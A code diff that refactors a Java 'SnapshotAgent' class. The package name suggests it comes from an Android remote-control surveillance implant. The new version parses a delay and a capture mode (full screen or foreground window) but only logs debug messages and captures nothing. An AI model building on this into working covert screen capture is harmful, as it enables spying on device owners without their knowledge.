@@ -1,82 +1,52 @@
 package com.ht.RCSAndroidGUI;
 
-import android.os.Message;
+import java.nio.ByteOrder;
 import android.util.Log;
 
-public class SnapshotAgent extends Thread implements Runnable {
-	private Command command;
+public class SnapshotAgent extends AgentBase {
+	final private static int  CAPTURE_FULLSCREEN = 0;
+	final private static int  CAPTURE_FOREGROUND = 1;
+	
+	private int delay;
+	private int type;
 	
 	public SnapshotAgent() { 
-		command = new Command(); 
-		
 		Log.d("Que", "SnapshotAgent constructor");
 	}
 	
-	public void run() {
-		while (true) {
-			try {
-				processMessage();
-			} catch (RCSException rcse) {
-				String msg = rcse.getMessage();
-				
-				if (msg == "stop") {
-					Log.d("Que", "SnapshotAgent closing");
-					return;
-				}
-				
-				// Manage log rotation
-				if (msg == "rotate") {
-					
-				}
-				
-				return;
-			}
-			
-			Utils.sleep(1000);
-		}
+	public void parse(byte[] conf) {
+		myConf = Utils.BufferToByteBuffer(conf, ByteOrder.LITTLE_ENDIAN);
+		
+		this.delay = myConf.getInt();
+		this.type = myConf.getInt();
 	}
 	
-	private void processMessage() throws RCSException {
-		Message m = getMessage();
+	public void begin() {
+		setDelay(this.delay);
+	}
+	
+	public void go() {
+		LogR log = new LogR(Agent.AGENT_SNAPSHOT, LogR.LOG_PRI_STD);
 		
-		if (m == null)
-			return;
-		
-		if (m.what != 'Q')
-			return;
-		
-		switch (m.arg1) {
-			case Agent.AGENT_STOP:
-				throw new RCSException("stop");
+		switch (type) {
+			case CAPTURE_FULLSCREEN:
+				Log.d("Que", "Snapshot Agent: logging full screen");
+				break;
 				
-			case Agent.AGENT_ROTATE:
-				throw new RCSException("rotate");
+			case CAPTURE_FOREGROUND:
+				Log.d("Que", "Snapshot Agent: logging foreground window");
+				break;
 				
-			default: break;
+			default:
+				Log.d("Que", "Snapshot Agent: wrong capture parameter");
+				break;
 		}
 		
-		return;
+		
+		log.close();
 	}
 	
-	private Message getMessage() {
-		Message m = command.getMessage();
-		return m;
-	}
-	
-	public void sendMessage(Message m) {
-		command.pushMessage(m);
+	public void end() {
 		
-		return;
-	}
-	
-	public void sendMessage(int arg1, int arg2) {
-		Message m = new Message();
-		m.arg1 = arg1;
-		m.arg2 = arg2;
-		m.what = 'Q';
-		
-		command.pushMessage(m);
-		
-		return;
 	}
 }
